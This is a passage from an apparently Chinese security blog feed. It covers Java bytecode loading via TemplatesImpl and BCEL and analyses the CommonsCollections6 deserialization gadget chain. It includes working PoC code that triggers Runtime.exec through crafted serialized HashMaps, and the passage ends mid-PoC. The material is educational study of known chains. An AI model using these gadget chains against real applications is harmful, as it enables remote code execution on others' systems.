<span class="type">int</span>.class);</span><br><span class="line">        defineClass.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = org.apache.commons.codec.binary.Base64.decodeBase64(<span class="string">&quot;yv66vgAAADQAHgoABwAPCQAQABEIABIKABMAFAgAFQcAFgcAFwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAR0ZXN0AQAKU291cmNlRmlsZQEAEERlZmluZUNsYXNzLmphdmEMAAgACQcAGAwAGQAaAQAWTmV3IGluc3RhbmNlIGNvbnN0cnVjdAcAGwwAHAAdAQAHdGVzdDEyMwEAC0RlZmluZUNsYXNzAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgAhAAYABwAAAAAAAgABAAgACQABAAoAAAAtAAIAAQAAAA0qtwABsgACEgO2AASxAAAAAQALAAAADgADAAAAAwAEAAQADAAFAAEADAAJAAEACgAAACUAAgABAAAACbIAAhIFtgAEsQAAAAEACwAAAAoAAgAAAAgACAAJAAEADQAAAAIADg==&quot;</span>);</span><br><span class="line">        System.out.println(ClassLoader.getSystemClassLoader());</span><br><span class="line">        <span class="type">Class</span> <span class="variable">hello</span> <span class="operator">=</span> (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="string">&quot;DefineClass&quot;</span>, code, <span class="number">0</span>, code.length);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> hello.newInstance();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">test</span> <span class="operator">=</span> hello.getMethod(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        test.invoke(o);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下</p><p><img src="/image/article/Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81TemplateImpl%E5%92%8CBCEL.assets/image-20240121223814985.png" alt="image-20240121223814985"></p><p>defineClass被调用类对象不会被初始化，需要调用构造函数才能执行代码</p><h3 id="TemplatesImpl利用链"><a href="#TemplatesImpl利用链" class="headerlink" title="TemplatesImpl利用链"></a>TemplatesImpl利用链</h3><p>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl中的内部类TransletClassLoader重写了defineClass</p><p><img src="/image/article/Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81TemplateImpl%E5%92%8CBCEL.assets/image-20240121224817610.png" alt="image-20240121224817610"></p><p>之前是protected修饰符现在是default 默认同包类可以访问</p><p>TemplatesImpl的利用链</p><p>TemplatesImpl#getOutputProperties&#x3D;&gt;TemplatesImpl#newTransformer&#x3D;&gt;TemplatesImpl#getTransletInstance&#x3D;&gt;emplatesImpl#defineTransletClasses&#x3D;&gt;TransletClassLoader#defineClass</p><p>首先getOutputProperties调用了newTransformer</p><p><img src="/image/article/Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81TemplateImpl%E5%92%8CBCEL.assets/image-20240123192559989.png" alt="image-20240123192559989"></p><p>newTransormer调用getTransletInstance</p><p><img src="/image/article/Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81TemplateImpl%E5%92%8CBCEL.assets/image-20240123195936384.png" alt="image-20240123195936384"></p><p>getTransletInstance调用defineTransletClasses</p><p><img src="/image/article/Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81TemplateImpl%E5%92%8CBCEL.assets/image-20240123200051209.png" alt="image-20240123200051209"></p><p>最终defineTransletClasses调用defineClass</p><p><img src="/image/article/Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81TemplateImpl%E5%92%8CBCEL.assets/image-20240123200255005.png" alt="image-20240123200255005"></p><p>POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.xalan.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> ysoserial.payloads.util.Reflections.setFieldValue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TemplatesImplClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = org.apache.commons.codec.binary.Base64.decodeBase64(<span class="string">&quot;yv66vgAAADIAMwoABwAiCQAjACQIACUKACYAJwoAJgAoBwApBwAqAQAJdHJhbnNmb3JtAQBQKExvcmcvYXBhY2hlL3hhbGFuL3hzbHRjL0RPTTtbTG9yZy9hcGFjaGUveG1sL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAHEx0ZXN0L2xvYWRlci9UZW1wbGF0ZXNJbXBsWDsBAANkb20BABxMb3JnL2FwYWNoZS94YWxhbi94c2x0Yy9ET007AQAVc2VyaWFsaXphdGlvbkhhbmRsZXJzAQAxW0xvcmcvYXBhY2hlL3htbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACsBAHMoTG9yZy9hcGFjaGUveGFsYW4veHNsdGMvRE9NO0xvcmcvYXBhY2hlL3htbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xvcmcvYXBhY2hlL3htbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAPZHRtQXhpc0l0ZXJhdG9yAQAkTG9yZy9hcGFjaGUveG1sL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAUc2VyaWFsaXphdGlvbkhhbmRsZXIBADBMb3JnL2FwYWNoZS94bWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAY8aW5pdD4BAAMoKVYBAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQAKU291cmNlRmlsZQEAE1RlbXBsYXRlc0ltcGxYLmphdmEMABoAGwcALAwALQAuAQATdGVtcGxhdGVYIGNvbnN0cnVjdAcALwwAMAAxDAAwADIBABp0ZXN0L2xvYWRlci9UZW1wbGF0ZXNJbXBsWAEAL29yZy9hcGFjaGUveGFsYW4veHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAob3JnL2FwYWNoZS94YWxhbi94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABChJKVYAIQAGAAcAAAAAAAQAAQAIAAkAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAAA0ADAAAACAAAwAAAAEADQAOAAAAAAABAA8AEAABAAAAAQARABIAAgATAAAABAABABQAAQAIABUAAgAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABIADAAAACoABAAAAAEADQAOAAAAAAABAA8AEAABAAAAAQAWABcAAgAAAAEAGAAZAAMAEwAAAAQAAQAUAAEAGgAbAAEACgAAAD8AAgABAAAADSq3AAGyAAISA7YABLEAAAACAAsAAAAOAAMAAAAUAAQAFQAMABYADAAAAAwAAQAAAA0ADQAOAAAACQAcAB0AAQAKAAAAOAACAAEAAAAKsgACEQKatgAFsQAAAAIACwAAAAoAAgAAABkACQAaAAwAAAAMAAEAAAAKAB4AHwAAAAEAIAAAAAIAIQ==&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">tpi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(tpi, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(tpi, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;TemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(tpi, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">org</span>.apache.xalan.xsltc.trax.TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        tpi.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>.class文件必须继承自AbstractTranslet</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.xalan.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> org.apache.xalan.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> org.apache.xalan.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> org.apache.xml.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> org.apache.xml.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TemplatesImplX</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM dom, SerializationHandler[] serializationHandlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM dom, DTMAxisIterator dtmAxisIterator, SerializationHandler serializationHandler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TemplatesImplX</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;templateX construct&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="number">666</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/image/article/Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81TemplateImpl%E5%92%8CBCEL.assets/image-20240125200549193.png" alt="image-20240125200549193"></p><h2 id="BCEL加载字节码"><a href="#BCEL加载字节码" class="headerlink" title="BCEL加载字节码"></a>BCEL加载字节码</h2><p>通过BCEL提供的两个类 Repository 和 Utility 来利用： </p><p>Repository 用于将一个Java Class 先转换成原生字节码，当然这里也可以直接使用javac命令来编译java文件生成字节码</p><p> Utility 用于将 原生的字节码转换成BCEL格式的字节码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloBCEL</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String []args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="type">JavaClass</span> <span class="variable">cls</span> <span class="operator">=</span> Repository.lookupClass(evil.Hello.class);</span><br><span class="line"><span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(cls.getBytes(), <span class="literal">true</span>);</span><br><span class="line">System.out.println(code);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>BCEL ClassLoader加载字节码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">ClassLoader</span>().loadClass(code).newInstance();</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">Java动态加载字节码TemplatesImpl和BCEL</summary>
    
    
    
    <category term="代码审计" scheme="http://example.com/category/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="Java代码审计" scheme="http://example.com/tag/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>shellcode的传输与混淆</title>
    <link href="http://example.com/posts/3174531485.html"/>
    <id>http://example.com/posts/3174531485.html</id>
    <published>2024-01-21T08:08:45.000Z</published>
    <updated>2024-03-03T12:23:35.605Z</updated>
    
    <content type="html"><![CDATA[<h1 id="shellcode的传输与混淆"><a href="#shellcode的传输与混淆" class="headerlink" title="shellcode的传输与混淆"></a>shellcode的传输与混淆</h1><h2 id="shellcode混淆"><a href="#shellcode混淆" class="headerlink" title="shellcode混淆"></a>shellcode混淆</h2>]]></content>
    
    
    <summary type="html">shellcode的传输与混淆</summary>
    
    
    
    <category term="web" scheme="http://example.com/category/web/"/>
    
    
    <category term="网络安全" scheme="http://example.com/tag/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Java利用链CommonCollections6分析</title>
    <link href="http://example.com/posts/4249740792.html"/>
    <id>http://example.com/posts/4249740792.html</id>
    <published>2024-01-20T13:14:59.000Z</published>
    <updated>2024-03-03T14:52:54.833Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java利用链CommonCollections6分析"><a href="#Java利用链CommonCollections6分析" class="headerlink" title="Java利用链CommonCollections6分析"></a>Java利用链CommonCollections6分析</h1><p>在CommonsCollections1的利用链中在Java 8u71之后的版本无法利用，因为在sun.reflect.annotation.AnnotationInvocationHandler的readObject方法发生了变化。在CC1的ysosserial中利用</p><p>AnnotationInvocationHandler#readObject&#x3D;&gt;AnnotationInvocationHandler#invoke&#x3D;&gt;LazyMap#get</p><p>最终调用LazyMap执行tansform，在CC6找到了新的触发LazyMap#get利用链</p><p>找到的类为org.apache.commons.collections.keyvalue.TiedMapEntry</p><h2 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h2><p>在TiedMapEntry中的getValue方法触发了get</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections6%E5%88%86%E6%9E%90.assets/image-20240120213239120.png" alt="image-20240120213239120"></p><p>而其hashcode方法又调用了getValue方法</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections6%E5%88%86%E6%9E%90.assets/image-20240120213332294.png" alt="image-20240120213332294"></p><p>利用链为</p><p>TiedMapEntry#hashcode&#x3D;&gt;TiedMapEntry#getValue&#x3D;&gt;LazyMap#get</p><p>需要继续找到触发TiedMapEntry#hashcode的类 改类为HashMap</p><h2 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h2><p>在Hashmap的hash方法中调用了hashcode，当key设置为TiedMapEntry就可以调用TiedMapEntry#hashcode</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections6%E5%88%86%E6%9E%90.assets/image-20240120214206984.png" alt="image-20240120214206984"></p><p>同时在HashMap的readObject方法中发现调用了hash方法</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections6%E5%88%86%E6%9E%90.assets/image-20240120214412274.png" alt="image-20240120214412274"></p><p>利用链为HashMap#readObject&#x3D;&gt;HashMap#hash</p><p>也就是说入口也找到了，直接反序列化构造的HashMap对象就可以执行整个利用链</p><p>整个利用过程为</p><p>HashMap#readObject&#x3D;&gt;HashMap#hash&#x3D;&gt;TiedMapEntry#hashcode&#x3D;&gt;TiedMapEntry#getValue&#x3D;&gt;LazyMap#get</p><h2 id="构造利用链"><a href="#构造利用链" class="headerlink" title="构造利用链"></a>构造利用链</h2><p>根据分析的利用链进行利用链构造，POC如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;key&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(tiedMapEntry,<span class="string">&quot;value&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化hashMap</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反序列化hashMap</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功弹出计算器</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections6%E5%88%86%E6%9E%90.assets/image-20240120215305021.png" alt="image-20240120215305021"></p><p>CC6利用链可以通过HashMap一个类直接触发，而在ysoserial中的触发则相对复杂利用到了多个类</p><h2 id="ysoserial中的CC6利用链"><a href="#ysoserial中的CC6利用链" class="headerlink" title="ysoserial中的CC6利用链"></a>ysoserial中的CC6利用链</h2><p>在ysoserial的利用链如下</p><p>HashSet#readObject&#x3D;&gt;HashMap#put&#x3D;&gt;HashMap#hash&#x3D;&gt;TiedMapEntry#hashCode</p><p>入口点为HashSet的readObject，由于HashMap#hash&#x3D;&gt;TiedMapEntry#hashCode已经追过源码继续追一下HashSet#readObject&#x3D;&gt;HashMap#put&#x3D;&gt;HashMap#hash的利用链</p><p>在HashMap中的put方法也触发了hash</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections6%E5%88%86%E6%9E%90.assets/image-20240120220021349.png" alt="image-20240120220021349"></p><p>HashSet的readObject方法触发了map#put</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections6%E5%88%86%E6%9E%90.assets/image-20240120220141829.png" alt="image-20240120220141829"></p><p>构造Gadget的难点是设置HashSet的key没有办法像HashMap一样直接put(key,value)，需要利用反射获取属性参数进行设置，在开始构造了如下gadget但是无法执行</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections6%E5%88%86%E6%9E%90.assets/image-20240120225337784.png" alt="image-20240120225337784"></p><p>提示报错</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections6%E5%88%86%E6%9E%90.assets/image-20240120225411211.png" alt="image-20240120225411211"></p><p>原因是在HashSet中的map属性必须为HashMap类型</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections6%E5%88%86%E6%9E%90.assets/image-20240120225505158.png" alt="image-20240120225505158"></p><p>看看ysoserial中是如何处理的</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections6%E5%88%86%E6%9E%90.assets/image-20240120225618529.png" alt="image-20240120225618529"></p><p>先获取创建Hashset的map属性没有则获取backingMap 最终类型为HashMap</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections6%E5%88%86%E6%9E%90.assets/image-20240120225747372.png" alt="image-20240120225747372"></p><p>获取返回HashMap的table属性没有则获取elementData属性</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections6%E5%88%86%E6%9E%90.assets/image-20240120225940340.png" alt="image-20240120225940340"></p><p>table为Node节点数组，Node用来存储key,value键值对</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections6%E5%88%86%E6%9E%90.assets/image-20240120230342405.png" alt="image-20240120230342405"></p><p>相应的array返回的就是Node节点数组</p><p>接下来在节点数组中拿到已有设置的节点对象</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections6%E5%88%86%E6%9E%90.assets/image-20240120230512183.png" alt="image-20240120230512183"></p><p>接下来获取Node节点对象的key属性</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections6%E5%88%86%E6%9E%90.assets/image-20240120230604042.png" alt="image-20240120230604042"></p><p>参看Node节点的key</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections6%E5%88%86%E6%9E%90.assets/image-20240120230632145.png" alt="image-20240120230632145"></p><p>最后关键一步设置key，entry为TiedMapEntry对象</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections6%E5%88%86%E6%9E%90.assets/image-20240120230652474.png" alt="image-20240120230652474"></p><p>根据ysoserial整个利用链来构造复现下 POC如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections6B</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title 